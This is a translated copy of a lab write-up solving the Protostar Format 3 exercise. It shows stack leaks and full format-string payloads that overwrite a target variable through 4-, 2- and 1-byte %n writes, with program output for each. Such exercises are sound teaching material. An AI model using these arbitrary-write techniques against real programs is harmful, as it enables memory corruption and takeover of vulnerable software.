<html>
<head>
<title>[ExpDev] Exploit Exercise | Protostar | Format 3</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[ExpDev]漏洞利用练习|原恒星|格式3</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/expdev-exploit-exercise-protostar-format-3-33e8d8f1e83?source=collection_archive---------0-----------------------#2020-05-30">https://infosecwriteups.com/expdev-exploit-exercise-protostar-format-3-33e8d8f1e83?source=collection_archive---------0-----------------------#2020-05-30</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/05948183c3b71742b10fa104216dbdb1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*IXBVQG1yzr2wM5v6.png"/></div></div></figure><h1 id="7413" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">格式3(格式字符串基本3)</h1><p id="8ccd" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">该挑战的目标是利用格式字符串漏洞将任意字节写入进程内存，并打印出获胜的语句。</p><ul class=""><li id="3f3f" class="lx ly it lb b lc lz lg ma lk mb lo mc ls md lw me mf mg mh bi translated">链接:<a class="ae mi" href="https://exploit-exercises.lains.space/protostar/format3/" rel="noopener ugc nofollow" target="_blank">https://exploit-exercises.lains.space/protostar/format3/</a></li></ul><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mj"><img src="../Images/5b7ae11db18082d9dacb1d64120be1a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zA2gCGumIVo5nXY-Cvf26Q.png"/></div></div></figure><h2 id="2176" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">注意事项</h2><ul class=""><li id="def6" class="lx ly it lb b lc ld lg lh lk na lo nb ls nc lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">char buffer[512]</strong></code>:设置缓冲区大小为512。</li><li id="7f32" class="lx ly it lb b lc nh lg ni lk nj lo nk ls nl lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">fgets(buffer, sizeof(buffer), stdin)</strong></code>:该函数获取用户提供的输入。并且它将缓冲区大小限制为512。我们最多可以输入511个字节，因为C总是在末尾添加<code class="fe nd ne nf ng b">0x00</code>作为字符串结束符。</li><li id="da99" class="lx ly it lb b lc nh lg ni lk nj lo nk ls nl lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">printf(string);</strong></code>:这是这段代码中易受攻击的函数。<code class="fe nd ne nf ng b">printf()</code>将<em class="nm">而不是</em>检查提供的输入是否是预期的格式字符串。这是因为它被编码为在格式参数应该在的位置接受任何输入值。因此，我们所能做的只是验证我们是否可以泄漏内存地址，并且还可以将任意值写入堆栈(<strong class="lb iu">【读取】</strong> <code class="fe nd ne nf ng b">%p</code>或<code class="fe nd ne nf ng b">%x</code> → <strong class="lb iu">【写入】</strong> <code class="fe nd ne nf ng b">%n</code>)。</li><li id="01d4" class="lx ly it lb b lc nh lg ni lk nj lo nk ls nl lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">if(target == 0x01025544) {</strong></code>:变量<code class="fe nd ne nf ng b">target</code>是我们需要在堆栈中找到的。然后，利用一个格式字符串漏洞，我们将把4个字节覆盖到<code class="fe nd ne nf ng b">target</code>以匹配<code class="fe nd ne nf ng b">0x01025544</code>来打印出获胜的语句。</li></ul></div><div class="ab cl nn no hx np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="im in io ip iq"><h1 id="c13d" class="kb kc it bd kd ke nu kg kh ki nv kk kl km nw ko kp kq nx ks kt ku ny kw kx ky bi translated">拆解(GDB)</h1><p id="559e" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">让我们反汇编二进制文件，看看在ASM级别做了什么。这和<code class="fe nd ne nf ng b">Format2</code>很像。唯一不同的是<code class="fe nd ne nf ng b">cmp</code>值:</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="bcd0" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ gdb -q format3</strong><br/>Reading symbols from /opt/protostar/bin/format3...done.<br/><strong class="ng iu">(gdb) set disassembly-flavor intel<br/>(gdb) disassemble vuln</strong></span></pre><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oh"><img src="../Images/be9a0b5852eb96feb52559e4a6762fe3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*m6Oo4XCER_QWtCU5dmcCoQ.png"/></div></div></figure></div><div class="ab cl nn no hx np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="im in io ip iq"><h1 id="4eba" class="kb kc it bd kd ke nu kg kh ki nv kk kl km nw ko kp kq nx ks kt ku ny kw kx ky bi translated">剥削</h1><h2 id="5477" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">初步侦察</h2><p id="65e2" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">让我们提供一些随机的字符串来观察程序的行为:</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="cf74" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ python -c 'print "AAAA"' | /opt/protostar/bin/format3 </strong><br/>AAAA<br/>target is 00000000 :(</span></pre><p id="4002" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">但是如果我们输入格式字符串参数(<code class="fe nd ne nf ng b">%08x</code>)，我们会得到一些有趣的输出:</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="106a" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ python -c 'print "AAAA" + "|%08x" * 2' | /opt/protostar/bin/format3 </strong><br/>AAAA|00000000|bffff590    <strong class="ng iu">&lt;-- Leaking memory address</strong><br/>target is 00000000 :(</span><span id="f18a" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu"><em class="nm">### Format String Explanation<br/>"%08x"</em></strong><em class="nm"> = "%x" is a Format String parameter of the hexdecimal <br/>         representation. <br/>         The number "08" is the minimum value for "width field."<br/>         This will pad the output of the "%x" specified to 8<br/>         characters, which is equal to 4 bytes long.</em></span></pre><h2 id="4cd0" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">寻找偏移</h2><p id="88ac" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">接下来，我们需要找到在堆栈上可以看到我们提供的输入的偏移量。如果我们尝试添加几个更多的<code class="fe nd ne nf ng b">%x</code>，我们可以在第12个位置找到偏移量。</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="c711" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ python -c 'print "AAAA" + "|%08x" * 12' | /opt/protostar/bin/format3 </strong><br/>AAAA|00000000|bffff590|b7fd7ff4|00000000|00000000|bffff798|0804849d|bffff590|00000200|b7fd8420|bffff5d4|<strong class="ng iu">41414141    &lt;-- chr(0x41) = "A"</strong><br/>target is 00000000 :(</span></pre><h2 id="ec61" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">寻找“目标”变量地址</h2><p id="a6e4" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">我们将使用<code class="fe nd ne nf ng b">objdump</code>来查找<code class="fe nd ne nf ng b">target</code>的地址:</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="9ae1" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ objdump -t /opt/protostar/bin/format3 |grep target</strong><br/><strong class="ng iu">080496f4</strong> g     O .bss 00000004              target</span></pre><p id="a0b2" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">找到的地址是<code class="fe nd ne nf ng b">0x080496f4</code>。把这个转换成little-endian格式= <code class="fe nd ne nf ng b">\xf4\x96\x04\x08</code>。</p><p id="1a12" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">现在，将提供的输入更改为<code class="fe nd ne nf ng b">target</code>地址。但是这次我们来看看能否用<code class="fe nd ne nf ng b">%n</code> (= <em class="nm">将字符写入指针</em>)在内存中写点东西。</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="548a" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ python -c 'print "\xf4\x96\x04\x08" + "%12$08n" * 12' | /opt/protostar/bin/format3</strong> <br/>��<br/>target is 00000004 :(    <strong class="ng iu">&lt;-- It wrote "4" at the "target" location</strong></span><span id="88ed" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu"><em class="nm">### Format String Explanation<br/>"%4$08n"</em></strong><em class="nm"> = Directly access the 4th parameter on stack with "4$" and <br/>           write the address </em>(\xe4\x96\x04\x08<strong class="ng iu">) </strong><em class="nm">there with "%08n"</em></span></pre><p id="85d2" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">太好了。我们可以看到值<code class="fe nd ne nf ng b">0x00000004</code>已经被写入<code class="fe nd ne nf ng b">target</code>地址位置。</p></div><div class="ab cl nn no hx np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="im in io ip iq"><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi om"><img src="../Images/f8df0dfedbe31f9eba2fb0df84a7531c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*h3K1KEDBhb5g-yUv.jpg"/></div></div></figure><p id="fbcb" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">有几种不同的方法来解决这一挑战。我将介绍3种不同的方法:</p><ul class=""><li id="496c" class="lx ly it lb b lc lz lg ma lk mb lo mc ls md lw me mf mg mh bi translated">4字节写入</li><li id="b93d" class="lx ly it lb b lc nh lg ni lk nj lo nk ls nl lw me mf mg mh bi translated">2字节短写</li><li id="6686" class="lx ly it lb b lc nh lg ni lk nj lo nk ls nl lw me mf mg mh bi translated">1字节写入</li></ul><h2 id="05d3" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">利用解决方案#1 (4字节写入)</h2><p id="420f" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">第一种解决方案是写入4个字节来填充宽度字段。既然我们知道要写什么值，我们只需要计算正确的宽度字段并用<code class="fe nd ne nf ng b">%n</code>写它们。(关于计算宽度长度的更多细节，请参见<code class="fe nd ne nf ng b"><a class="ae mi" href="https://medium.com/bugbountywriteup/expdev-exploit-exercise-protostar-format-2-73ef08011a8c" rel="noopener">Format 2</a></code> <a class="ae mi" href="https://medium.com/bugbountywriteup/expdev-exploit-exercise-protostar-format-2-73ef08011a8c" rel="noopener">挑战</a>。)</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="db78" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">[Calculating Width Fields]</strong></span><span id="71c4" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu">$ gdb -q /opt/protostar/bin/format3</strong><br/>  Reading symbols from /opt/protostar/bin/format3...done.<br/><strong class="ng iu">(gdb) print 0x01025544 - 0x04     </strong><br/>  $1 = 16930112                   <strong class="ng iu">&lt;-- Width Fields</strong></span><span id="ac3e" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu"><em class="nm">### Calculation Explanation</em></strong><br/>"<strong class="ng iu">0x01025544" </strong>= The target value to write<strong class="ng iu"><br/>"0x04" </strong>= The current output value</span></pre><p id="7975" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">宽度字段计算到<code class="fe nd ne nf ng b">16930112</code>。让我们将它添加到我们的有效载荷中:</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="859c" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ python -c 'print "\xf4\x96\x04\x08" + "%16930112x%12$08n"' | /opt/protostar/bin/format3</strong></span><span id="668b" class="mo kc it ng b gy ol oe l of og">...(snip for A LOT OF white spaces)...</span><span id="f451" class="mo kc it ng b gy ol oe l of og">                               0<br/><strong class="ng iu">you have modified the target :)     &lt;-- Winning Statement!</strong></span></pre><p id="3afe" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">一旦我们运行了更新的有效负载，我们就可以看到获胜的语句。让我们做下一个方法。</p></div><div class="ab cl nn no hx np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="im in io ip iq"><h2 id="0153" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">利用解决方案#2 (2字节写入)</h2><p id="7879" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">第二个解决方案是使用短写，更具体地说是使用<code class="fe nd ne nf ng b">%hn</code>格式字符串参数的2字节写操作。</p><p id="59a7" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">为了更清楚，让我快速解释一下这是如何工作的。首先，让我们在gdb中搜索“目标”地址:</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="62f8" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">(gdb) print &amp;target</strong><br/>  $1 = (int *) 0x80496f4</span></pre><p id="6ff9" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">然后，检查十六进制的<code class="fe nd ne nf ng b">target</code>地址(在。bss段，其指未使用的数据段，并且存储在该段中的数据被设置为零)。将其分解为每个字节，显示每个地址:</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="4cd9" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">(gdb) x/wx 0x80496f4</strong><br/>  0x80496f4 &lt;target&gt;:    0x00<strong class="ng iu">00</strong>|00<strong class="ng iu">00</strong><br/>                              ⬇<br/>       0x00           <strong class="ng iu">00</strong>             00             <strong class="ng iu">00</strong><br/>       ------------------------------------------------------<br/>       0x80496<strong class="ng iu">f</strong>7      <strong class="ng iu">0x80496f6</strong>      0x80496f5      <strong class="ng iu">0x80496f4</strong></span></pre><p id="149d" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">从上面的表示中，显然现在<code class="fe nd ne nf ng b">target</code>没有任何值被写入；然而，4字节十六进制位置(<code class="fe nd ne nf ng b">0x00000000</code>)是我们需要替换为<code class="fe nd ne nf ng b">0x01025544</code>的地方。</p><p id="3607" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">所以对于2字节写方法，我们需要利用地址:<code class="fe nd ne nf ng b">0x80496f4</code>和<code class="fe nd ne nf ng b">0x80496f6</code>。</p><p id="5b01" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">让我们验证我们是否可以在这些<code class="fe nd ne nf ng b">0x80496f6</code>和<code class="fe nd ne nf ng b">0x80496f4</code>地址上写入任意值:</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="cefd" class="mo kc it ng b gy od oe l of og">$ python -c 'print <br/>"\xf4\x96\x04\x08" +     <strong class="ng iu"># Little-Endian format of 0x80496f4</strong><br/>"\xf6\x96\x04\x08" +     <strong class="ng iu"># Little-Endian format of 0x80496f6</strong><br/>"%12$hn" + "%13$hn"'     <strong class="ng iu"># Writing 2 bytes in each offset location</strong><br/>| /opt/protostar/bin/format3</span><span id="071c" class="mo kc it ng b gy ol oe l of og">���<br/>target is <strong class="ng iu">00080008</strong> :(</span></pre><p id="1d0e" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">我们可以看到，我们的尝试在每个地址位置上写入了<code class="fe nd ne nf ng b">0x0008</code>值。现在，我们只需要计算宽度字段，以便输出我们想要的值。</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="c406" class="mo kc it ng b gy od oe l of og">0x01025544    <strong class="ng iu">&lt;-- Desired value &amp; divide this into 2</strong><br/>    ⬇</span><span id="8414" class="mo kc it ng b gy ol oe l of og">  0x0102      <strong class="ng iu">&lt;-- We will write this on address starting from "f4"</strong><br/>  0x5544      <strong class="ng iu">&lt;-- We will write this on address starting from "f6"</strong><br/>    ⬇</span><span id="1d11" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu">[Width Calculation #1: "f4"]<br/>____________________________________________________________________    <br/></strong><em class="nm"># Written value was "0008." In order to calculate the width field, we need to subtract "0008" from our desired value = "0x0102"</em></span><span id="80de" class="mo kc it ng b gy ol oe l of og">(gdb) print 0x0102 - 0x08<br/>  $1 = <strong class="ng iu">250</strong></span><span id="ad19" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu">&gt;&gt;&gt; Payload</strong><br/>$ python -c 'print <br/>"\xf4\x96\x04\x08" + <br/>"\xf6\x96\x04\x08" + <br/>"%250x%13$hn" +         <strong class="ng iu"># Adding Width = 250</strong><br/>"%12$hn"' <br/>| /opt/protostar/bin/format3<br/>��                                                                                                                                                                                                                                                         0<br/>target is <strong class="ng iu">0102</strong>0102 :(    <strong class="ng iu">&lt;-- First 2 bytes written correctly</strong></span><span id="a83b" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu"><br/>[Width Calculation #2: "f6"]<br/>____________________________________________________________________</strong><em class="nm"># From the above calculation as you can see the second 2 byte location is also filled with "0102" which means we need to subtract that value from our desired value.</em></span><span id="e4cd" class="mo kc it ng b gy ol oe l of og">(gdb) p 0x5544 - 0x0102<br/>  $7 = <strong class="ng iu">21570</strong></span><span id="21d2" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu">&gt;&gt;&gt; Payload</strong><br/>$ python -c 'print <br/>"\xf4\x96\x04\x08" + <br/>"\xf6\x96\x04\x08" + <br/>"%250x%13$hn" +         <strong class="ng iu"># Adding Width = 250</strong> <br/>"%21570x%12$hn"'       <strong class="ng iu"> # Adding Width = 21570</strong><br/>| /opt/protostar/bin/format3<br/>��                                                                                                                                                                                                                                                         0<br/>...(snip for A LOT OF white spaces)...<br/>                                                       bffff590<br/><strong class="ng iu">you have modified the target :)    &lt;-- Winning Statement!</strong></span></pre><p id="9b45" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">太好了。第二种方法也成功了，我们可以看到我们的胜利宣言！</p></div><div class="ab cl nn no hx np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="im in io ip iq"><h2 id="0fa2" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">利用解决方案#3 (1字节写入)</h2><p id="f304" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">最后一种解决方案是1字节写入。执行这种利用的流程非常类似于2字节写方法，但是我们将利用地址位置的每个字节。</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="7964" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">### Examine the "target" address in hex<br/>(gdb) x/wx 0x80496f4</strong><br/>  0x80496f4 &lt;target&gt;:    <strong class="ng iu">0x00|00|00|00</strong><br/>                              ⬇<br/>       <strong class="ng iu">0x00</strong>           <strong class="ng iu">00</strong>             <strong class="ng iu">00</strong>             <strong class="ng iu">00</strong><br/>       ------------------------------------------------------<br/>       <strong class="ng iu">0x80496f7</strong>      <strong class="ng iu">0x80496f6</strong>      <strong class="ng iu">0x80496f5</strong>      <strong class="ng iu">0x80496f4</strong></span></pre><p id="f760" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">让我们向每个地址位置写入一些值:</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="5d78" class="mo kc it ng b gy od oe l of og">$ python -c 'print <br/>"\xf4\x96\x04\x08" +     <strong class="ng iu"># Little-Endian format of 0x80496f4</strong><br/>"\xf5\x96\x04\x08" +     <strong class="ng iu"># Little-Endian format of 0x80496f5</strong><br/>"\xf6\x96\x04\x08" +     <strong class="ng iu"># Little-Endian format of 0x80496f6 </strong><br/>"\xf7\x96\x04\x08" +     <strong class="ng iu"># Little-Endian format of 0x80496f7</strong> <br/>"%12$n" +                <strong class="ng iu"># Writing into 0x80496f4</strong><br/>"%13$n" +                <strong class="ng iu"># Writing into 0x80496f5</strong> <br/>"%14$n" +                <strong class="ng iu"># Writing into 0x80496f6</strong> <br/>"%15$n"'                 <strong class="ng iu"># Writing into 0x80496f7</strong><br/>| /opt/protostar/bin/format3</span><span id="18fc" class="mo kc it ng b gy ol oe l of og">�����<br/>target is <strong class="ng iu">10101010</strong> :(</span></pre><p id="8ad6" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">让我们根据目标值<code class="fe nd ne nf ng b">0x01025544</code>进行正常的宽度场计算过程:</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="a26b" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">[Width Calculation #1: "f4"]<br/>____________________________________________________________________</strong></span><span id="8cf9" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu">(gdb) print 0x44 - 0x10</strong><br/>  $1 = 52</span><span id="7eef" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu">&gt;&gt;&gt; Payload</strong><br/>$ python -c 'print <br/>"\xf4\x96\x04\x08" + <br/>"\xf5\x96\x04\x08" + <br/>"\xf6\x96\x04\x08" + <br/>"\xf7\x96\x04\x08" + <br/><strong class="ng iu">"%52x%12$n"</strong> +          <strong class="ng iu"># Adding Width = 52</strong><br/>"%13$n" + <br/>"%14$n" + <br/>"%15$n"' <br/>| /opt/protostar/bin/format3</span><span id="9a33" class="mo kc it ng b gy ol oe l of og">����                                                   0<br/>target is 444444<strong class="ng iu">44</strong> :(</span><span id="ba53" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu"><br/>[Width Calculation #2: "f5"]<br/>____________________________________________________________________</strong></span><span id="19da" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu">(gdb) p 0x55 - 0x44</strong><br/>  $8 = 17</span><span id="29a7" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu">&gt;&gt;&gt; Payload</strong><br/>$ python -c 'print <br/>"\xf4\x96\x04\x08" + <br/>"\xf5\x96\x04\x08" + <br/>"\xf6\x96\x04\x08" + <br/>"\xf7\x96\x04\x08" + <br/><strong class="ng iu">"%52x%12$n"</strong> +          <strong class="ng iu"># Adding Width = 52</strong> <br/><strong class="ng iu">"%17x%13$n"</strong> +          <strong class="ng iu"># Adding Width = 17</strong><br/>"%14$n" + <br/>"%15$n"' <br/>| /opt/protostar/bin/format3</span><span id="d597" class="mo kc it ng b gy ol oe l of og">����                                                   0         bffff590<br/>target is 5555<strong class="ng iu">5544</strong> :(</span><span id="7f56" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu"><br/>[Width Calculation #3: "f6"]<br/>____________________________________________________________________</strong></span><span id="2523" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu">(gdb) print 0x02 - 0x55</strong><br/>  $9 = -83</span><span id="c09a" class="mo kc it ng b gy ol oe l of og"><em class="nm"># Holdup... Negative output? Obviously, we cannot use this negative padding. In this case, however, there is a trick that we overflow into the next byte to get our desired value on the target location. Since we have a control on stack, we can still overwrite the overflowed value. Example below:</em></span><span id="36bb" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu">(gdb) print 0x102 - 0x55</strong><br/>  $10 = <strong class="ng iu">173</strong></span><span id="aece" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu">&gt;&gt;&gt; Payload</strong><br/>$ python -c 'print <br/>"\xf4\x96\x04\x08" + <br/>"\xf5\x96\x04\x08" + <br/>"\xf6\x96\x04\x08" + <br/>"\xf7\x96\x04\x08" + <br/><strong class="ng iu">"%52x%12$n"</strong> +          <strong class="ng iu"># Adding Width = 52</strong> <br/><strong class="ng iu">"%17x%13$n"</strong> +          <strong class="ng iu"># Adding Width = 17</strong><br/><strong class="ng iu">"%173x%14$n"</strong> +         <strong class="ng iu"># Adding Width = 173</strong><br/>"%15$n"' <br/>| /opt/protostar/bin/format3</span><span id="e56e" class="mo kc it ng b gy ol oe l of og">����                                                   0         bffff590                                                                                                                                                                     b7fd7ff4<br/>target is 02<strong class="ng iu">025544</strong> :(<br/></span><span id="0b38" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu">[Width Calculation #4: "f7"]<br/>____________________________________________________________________</strong></span><span id="941a" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu">(gdb) p 0x01 - 0x02</strong><br/>  $11 = -1</span><span id="48ad" class="mo kc it ng b gy ol oe l of og"><em class="nm"># Same thing</em></span><span id="aa3f" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu">(gdb) p 0x101 - 0x02</strong><br/>  $12 = <strong class="ng iu">255</strong></span><span id="d151" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu">&gt;&gt;&gt; Payload</strong><br/>$ python -c 'print <br/>"\xf4\x96\x04\x08" + <br/>"\xf5\x96\x04\x08" + <br/>"\xf6\x96\x04\x08" + <br/>"\xf7\x96\x04\x08" + <br/><strong class="ng iu">"%52x%12$n"</strong> +          <strong class="ng iu"># Adding Width = 52</strong> <br/><strong class="ng iu">"%17x%13$n"</strong> +          <strong class="ng iu"># Adding Width = 17</strong><br/><strong class="ng iu">"%173x%14$n"</strong> +         <strong class="ng iu"># Adding Width = 173</strong><br/><strong class="ng iu">"%255x%15$n"</strong>'          <strong class="ng iu"># Adding Width = 255</strong><br/>| /opt/protostar/bin/format3</span><span id="5a04" class="mo kc it ng b gy ol oe l of og">����                                                   0         bffff590                                                                                                                                                                     b7fd7ff4                                                                                                                                                                                                                                                              0<br/><strong class="ng iu">you have modified the target :)    &lt;-- Winning Statement!</strong></span></pre><p id="7ce8" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">完美！它还成功地在<code class="fe nd ne nf ng b">target</code>上写下了我们想要的值，并打印出了获胜声明。</p><p id="e474" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">感谢阅读！</p><h2 id="3df2" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">下一个挑战:</h2><ul class=""><li id="5ec0" class="lx ly it lb b lc ld lg lh lk na lo nb ls nc lw me mf mg mh bi translated"><a class="ae mi" href="https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-format-4-e2907b4716d1" rel="noopener"> <strong class="lb iu">格式4 </strong> </a>:格式字符串漏洞利用:得到</li></ul><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi on"><img src="../Images/4b18e7e6e771c704c23acc723a87f9d1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*2i-A5QU3IKcmpYK4.png"/></div></div></figure></div></div>    
</body>
</html>